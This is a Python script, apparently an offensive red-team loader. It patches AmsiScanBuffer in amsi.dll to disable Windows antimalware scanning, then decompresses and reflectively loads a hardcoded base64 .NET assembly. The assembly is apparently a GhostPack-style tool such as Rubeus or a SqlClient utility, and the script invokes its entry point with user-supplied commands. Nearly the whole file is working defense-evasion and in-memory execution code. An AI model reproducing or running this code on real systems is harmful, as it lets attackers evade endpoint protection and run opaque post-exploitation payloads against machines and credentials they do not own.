import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SqlClient.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()